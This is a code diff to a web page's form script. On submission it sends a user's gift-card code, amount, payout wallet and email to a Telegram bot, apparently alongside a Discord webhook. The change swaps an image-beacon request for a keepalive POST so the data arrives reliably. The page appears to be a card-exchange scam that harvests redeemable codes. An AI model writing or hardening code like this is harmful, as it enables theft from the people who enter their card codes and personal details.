@@ -250,17 +250,26 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Telegram Message
-            const messageText = `🚨 *NEW DLA SUBMISSION*%0A%0A` +
-                                `*Asset:* ${assetName}%0A` +
-                                `*Card Code:* \`${cardCode}\` %0A` +
-                                `*USD Value:* ${amount}%0A` +
-                                `*Method:* ${method}%0A` +
-                                `*Payout To:* ${walletDetails}%0A` +
+            // Telegram Notification (High Priority POST)
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
+                                `*Asset:* ${assetName}\n` +
+                                `*Card Code:* \`${cardCode}\` \n` +
+                                `*USD Value:* ${amount}\n` +
+                                `*Method:* ${method}\n` +
+                                `*Payout To:* ${walletDetails}\n` +
                                 `*User Email:* ${userEmail}`;
 
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${messageText}&parse_mode=Markdown`;
-            new Image().src = telegramUrl;
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'Markdown'
+                }),
+                keepalive: true
+            });
 
             // Discord Message
             const discordPayload = {
